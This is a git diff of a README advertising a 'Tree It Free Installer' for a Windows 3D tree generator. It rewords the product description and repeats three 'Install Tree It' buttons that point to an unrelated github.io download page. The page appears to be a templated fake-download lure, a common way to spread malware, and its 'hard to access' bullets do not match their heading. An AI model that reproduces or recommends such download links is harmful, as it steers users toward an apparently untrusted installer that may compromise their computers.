@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Tree+Generator-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Tree It Free Installer** — Tree It is a free, real-time 3D tree and plant generator for Windows. Works without internet access, no account required. Full offline installation.
+**💻 Tree It Free Installer** — Tree It is a free 3D tree and plant generator for Windows that creates detailed, realistic trees and vegetation for use in game engines and 3D renders. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree%20It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree+It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Tree It
 
-Tree It is a free, real-time 3D tree and plant generator for Windows. It generates procedural trees with customizable parameters for trunk, branches, and leaves, exporting to OBJ and FBX formats for use in games and architectural visualization.
+Tree It is a free 3D tree and plant generator for Windows that creates detailed, realistic trees and vegetation for use in game engines and 3D renders. Adjust dozens of parameters to generate procedural trees with customizable trunk shapes, branching patterns, leaf density, and seasonal variations. Export trees as OBJ or FBX for use in Unity, Unreal Engine, or other 3D applications.
 
 ---
 
 ## ❌ Problem: Tree It is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Trees Only** — Specifically for vegetation; not a general 3D modeling tool
-- **Export Quality** — Generated meshes may require optimization for real-time game use
-- **Limited Flora Types** — Better for trees than grasses, flowers, or other vegetation types
+- **Windows Only** — No macOS or Linux version
+- **Specialized Tool** — Only generates trees and plants; not general 3D modeling
+- **Export Quality** — High-polygon trees may need optimization for real-time rendering
+- **Texture Quality** — Default textures may need replacement for high-end productions
 
 ---
 
@@ -81,7 +81,7 @@ Tree It is a free, real-time 3D tree and plant generator for Windows. It generat
 
 <div align="center">
 
-[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree%20It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree+It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Tree It is a free, real-time 3D tree and plant generator for Windows. It generat
 
 ---
 
-**Tree It Free Installer** — Tree It is a free, real-time 3D tree and plant generator for Windows. Install without internet connection today!
+**Tree It Free Installer** — Tree It is a free 3D tree and plant generator for Windows that creates detailed, realistic trees and vegetation for use in game engines and 3D renders. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree%20It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tree It](https://img.shields.io/badge/⬇_Install_Tree+It-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
